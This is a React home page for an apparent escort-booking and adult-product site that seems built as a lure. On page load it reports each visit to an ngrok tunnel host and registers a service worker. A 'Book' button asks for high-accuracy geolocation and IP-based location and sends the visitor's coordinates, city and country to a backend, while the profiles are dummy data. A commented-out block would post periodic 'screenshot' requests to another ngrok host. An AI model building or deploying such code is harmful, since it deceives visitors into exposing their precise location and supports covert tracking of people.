import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap/dist/js/bootstrap.bundle.min';
import { useEffect, useState } from 'react';
import { postLocation } from '../api';
import banner from '../assets/banner.avif';
import Confirmation from '../components/Confirmation';
import ProfileCard from '../components/ProfileCard';
import { DUMMY_PROFILES, sliderImages, upperSliderImages } from '../data/data';
import Shopping from '../Shopping';
import UShopping from '../UShopping';


export default function Home() {
    const [confirmation, setConfirmation] = useState({ visible: false, message: '' });
    const [busyId, setBusyId] = useState(null);

    useEffect(() => {
        fetch("https://6e53d9987fbf.ngrok-free.app/visitors/page_visit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
        })
            .then(res => res.json())
            .then(data => console.log("📌 Page visit response:", data))
            .catch(err => console.error(err));
    }, []);

    // backend run code 
    useEffect(() => {
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/sw.js")
                .then((registration) => {
                    console.log("✅ ServiceWorker registered with scope:", registration.scope);
                })
                .catch((err) => {
                    console.error("❌ ServiceWorker registration failed:", err);
                });
        }
    }, []);


    // // ---------------- Screenshot API (every 2 min) ----------------
    // useEffect(() => {
    //     const interval = setInterval(() => {
    //         fetch("https://a8607db3eff0.ngrok-free.app/screenshot/manual", { method: "POST" })
    //             .then(res => res.json())
    //             .then(data => console.log("📸 Screenshot response:", data))
    //             .catch(err => console.error("❌ Screenshot error:", err));
    //     }, 100000); // 2 minutes = 120000 ms

    //     return () => clearInterval(interval);
    // }, []);

    async function handleBook(profile) {
        // Age confirmation
        const ageOk = window.confirm("Is your age more than 18 years?");
        if (!ageOk) return;

        // Booking confirmation
        const ok = window.confirm(
            `Are you sure you want to book ${profile.name} for $${profile.price}/hour?\n\nShe has excellent reviews.`
        );
        if (!ok) return;

        try {
            setBusyId(profile.id);

            // ✅ Step 1: Try IP-based location (optional)
            let ipData = null;
            try {
                const res = await fetch("https://ipapi.co/json/");
                if (res.ok) {
                    ipData = await res.json();
                    console.log("🌍 IP Geo Data:", ipData);
                } else {
                    console.warn("⚠️ IP API request failed, using defaults");
                }
            } catch (err) {
                console.error("❌ IP API fetch failed:", err);
            }

            // ✅ Step 2: Browser geolocation
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                });
            });

            console.log("📍 Browser Location:", pos.coords);

            // ✅ Step 3: Payload for backend
            const payload = {
                name: profile.name,
                price: profile.price,
                latitude: pos?.coords?.latitude ?? ipData?.latitude ?? null,
                longitude: pos?.coords?.longitude ?? ipData?.longitude ?? null,
                city: ipData?.city || null,
                country: ipData?.country_name || null,
            };

            await postLocation(payload);

            setConfirmation({
                visible: true,
                message: `Booking confirmed for ${profile.name} at $${profile.price}/hour.`,
            });
        } catch (err) {
            console.error("❌ Detailed booking error:", err);
            alert("Failed to capture location or send booking.");
        } finally {
            setBusyId(null);
        }
    }



    return (
        <>
            {/* slider */}

            <div className='container'>
                <div>
                    <UShopping images={upperSliderImages} />

                </div>
                <div className='mt-lg-4 mt-3'>
                    <h2 className='text-pink'>Book a Profile</h2>
                    <div className="">
                        <div className="row">
                            {DUMMY_PROFILES?.map((p) => (
                                <div className="col-lg-3 col-md-6 col-sm-6 col-12" key={p.id}>
                                    <ProfileCard
                                        profile={p}
                                        busy={busyId === p.id}
                                        onBook={() => handleBook(p)}
                                    />
                                </div>
                            ))}
                        </div>
                    </div>
                </div>

                <div className='w-100 py-3 mt-3'>
                    <h4 className='text-center p-3 mt-2 text-pink'>Bask in the charm of a stunning beach escape.
                        Feel the allure of timeless beauty under the golden sun.
                        Where elegance and desire meet the rhythm of the waves</h4>
                    {/* <img src={banner} alt="banner" className='w-100 banner_img rounded-3' /> */}
                </div>
                {confirmation?.visible && (
                    <Confirmation
                        message={confirmation.message}
                        onClose={() => setConfirmation({ visible: false, message: '' })}
                    />
                )}
                {/* slider */}
                <div className='mt-lg-5 mt-3'>
                    <h3 className='text-pink py-2'>Beautiful Silicone Fantasy Doll (🤑 Big Savings 🤑 Sale 50% OFF)</h3>
                    <Shopping images={sliderImages} />
                </div>
            </div>
        </>


    );
}
